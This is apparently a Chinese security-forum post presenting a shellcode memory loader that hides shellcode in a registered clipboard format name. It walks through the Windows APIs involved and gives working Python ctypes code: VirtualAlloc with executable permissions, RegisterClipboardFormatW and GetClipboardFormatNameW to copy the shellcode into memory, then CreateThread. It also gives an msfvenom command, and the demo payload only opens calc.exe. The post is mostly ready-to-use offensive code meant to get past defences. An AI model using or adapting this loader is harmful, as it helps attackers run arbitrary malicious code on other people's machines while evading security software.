前言
==

最近研究内存加载器魔怔了，我们知道所有内存加载器原理都一个样：申请可执行内存-&gt;shellcode写入内存-&gt;执行该内存

申请内存还是比较好说的，去win开发手册搜搜就能找到很多申请内存的api，然后使用VirtualProtect将申请的内存区块设置为可执行即可

执行内存里面的内容也好说，使用CreateThread创建一个进程是常用的，或者使用EnumSystemLocalesA等回调函数直接运行也是可以的，这种回调函数在开发手册也随处可见

困难的是怎么把shellcode写入内存当中，在之前写入内存都是用RtlMoveMemory、RtlCopyMemory等函数，后来爆出一种UUID方式写入内存，我自己又延伸了MAC、IPV4、IPV6方式写入内存、再然后我发现读取注册表REG可以将内容写入内存。真是越走越远，越走越花里胡哨。。。

剪切板
===

什么是剪切板：剪切板是一组功能和使应用程序来传输的数据消息。由于所有应用程序都可以访问剪贴板，因此可以轻松地在应用程序之间或应用程序内传输数据。

剪切板格式：我们复制粘贴操作的对象有很多种，比如文字，图片，程序等等。每种类型的对象对应不同的剪切板格式，但这些格式都是已经定义好的，每个格式对应不同的标识值。

注册剪切板格式：顾名思义我们可以注册一个新的剪切板格式来存放我们的数据

剪切板加载器
======

没错，我又发现了一种写入内存的方式

昨天等项目的时候，无聊又去逛了逛win开发手册，看到了我们经常用的剪切板的各类api函数

我就随便逛了逛，哎？发现一个函数GetClipboardFormatName

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-0a8715c45977d5835d1ef031206bf6bb425449b4.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-0a8715c45977d5835d1ef031206bf6bb425449b4.png)  
能写入东西到缓冲区？这不来了吗

函数介绍
====

### RegisterClipboardFormat

该函数是user32.dll库中的函数，用来注册新的剪贴板格式。然后可以将此格式用作有效的剪贴板格式

函数原型：

<https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-registerclipboardformatw>

```php
UINT RegisterClipboardFormatW(
  LPCSTR lpszFormat
);
```

lpszFormat参数是新格式的名称

注册成功则返回一个该格式对应的标识值

```php
nameid = ctypes.windll.user32.RegisterClipboardFormatW('test')
```

### GetClipboardFormatName

该函数是user32.dll库中的函数，可以从剪贴板中检索指定注册格式的名称，并将名称复制到指定的缓冲区。

函数原型：

<https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboardformatnamew>

```php
int GetClipboardFormatNameW(
  UINT   format,
  LPWSTR lpszFormatName,
  int    cchMaxCount
);
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-5cb2bc9cfe14468e09f0f6e5f36e1be3b4c5dfd5.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-5cb2bc9cfe14468e09f0f6e5f36e1be3b4c5dfd5.png)

这个函数是大致功能我们可以看到啊，检索我们指定格式的剪切板，将它的名称写入缓存区

写加载器
====

上面两个api函数一个是创建剪切板，一个是读取剪切板的名

我们如果用shellcode命名该剪切板，当我们读取该名称时不就可以将shellcode写入缓存区了？

首先生成shellcode，这里生成要注意排除\\x00字符，防止被截断。

```php
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -b="\x00" -f py -o 123.py
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-d20d544214093ad2d5654c58e03774868054801b.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-d20d544214093ad2d5654c58e03774868054801b.png)

然后申请一块内存

```php
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(buf)+1, 0x3000, 0x40)
```

使用shellcode当做名称，注册一个新的剪切板格式，这里shellcode一定排除\\x00字符，不然名称会被截断。

```php
name = ctypes.windll.user32.RegisterClipboardFormatW(buf)
```

获取该剪切板格式的名称，并写入申请的内存

```php
ctypes.windll.user32.GetClipboardFormatNameW(name,ptr,len(buf)+1)
```

然后创建进行运行即可

```php
handle = ctypes.windll.kernel32.CreateThread(0,0,ptr,0,0,0)
ctypes.windll.kernel32.WaitForSingleObject(handle,-1)
```

测试
==

使用py版本2.7，msf生成64位弹计算器payload

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-b9d38d5a046b189dc238ab40c5e1568db3f1670f.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-b9d38d5a046b189dc238ab40c5e1568db3f1670f.png)

成功运行